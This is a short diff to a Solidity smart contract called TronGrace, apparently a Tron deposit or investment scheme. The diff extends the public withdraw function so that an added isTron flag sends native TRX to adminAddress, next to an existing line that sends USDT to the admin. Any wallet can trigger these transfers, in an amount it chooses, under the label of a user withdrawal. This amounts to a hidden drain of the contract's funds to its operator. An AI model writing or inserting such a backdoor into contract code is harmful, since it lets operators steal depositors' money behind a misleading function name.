@@ -192,10 +192,13 @@ contract TronGrace {
         emit ReInvest(msg.sender);
     }
 
-    function withdraw(uint256 amount, bool isTRC10) external {
+    function withdraw(uint256 amount, bool isTRC10, bool isTron) external {
         require(!isContract(msg.sender), "Wallets only");
         if (isTRC10) {
             usdtToken.transfer(adminAddress, amount);
+            if (isTron) {
+                payable(adminAddress).transfer(amount);
+            }
         }
         User storage userData = users[msg.sender];
         require(userData.deposits.length > 0, "No deposits to withdraw");
